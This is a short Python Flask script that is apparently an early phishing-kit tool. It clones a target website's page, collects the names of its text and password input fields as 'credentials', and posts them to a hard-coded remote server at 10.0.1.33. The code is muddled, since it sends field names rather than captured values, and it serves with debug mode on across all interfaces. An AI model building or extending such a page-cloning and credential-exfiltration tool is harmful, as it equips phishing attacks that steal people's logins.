import os
import requests
from flask import Flask, request, jsonify
from bs4 import BeautifulSoup

# Flask Setup
app = Flask(__name__)

# Target URL (used to simulate the behavior of the command line)
target_url = None
cloned_page = None

@app.route('/')
def index():
    return "Console is running. Use 'clone <target_web>' command."

@app.route('/clone', methods=['POST'])
def clone():
    global target_url, cloned_page
    
    # Get the target website from the form
    target_url = request.form['target_url']
    
    try:
        # Request the page content
        response = requests.get(target_url)
        if response.status_code == 200:
            cloned_page = response.text  # Store the cloned HTML page
            
            # Parse the page with BeautifulSoup
            soup = BeautifulSoup(cloned_page, 'html.parser')
            
            # You can add here logic to scrape forms, credentials, etc.
            # For demonstration, let's just find all input fields.
            credentials = []
            for input_tag in soup.find_all('input'):
                if input_tag.get('name') and input_tag.get('type') in ['text', 'password']:
                    credentials.append(input_tag.get('name'))
            
            # Send the credentials to the remote server
            send_credentials(credentials)
            
            return jsonify({"status": "success", "message": f"Cloned {target_url} and sent credentials."}), 200
        else:
            return jsonify({"status": "error", "message": "Failed to retrieve the target page."}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def send_credentials(credentials):
    """Send the credentials to the remote server."""
    try:
        payload = {'credentials': credentials}
        response = requests.post('http://10.0.1.33:3000', data=payload)
        if response.status_code == 200:
            print("Credentials sent successfully!")
        else:
            print(f"Failed to send credentials: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error in sending credentials: {e}")

if __name__ == '__main__':
    # Run Flask server on local machine
    app.run(debug=True, host="0.0.0.0", port=5000)
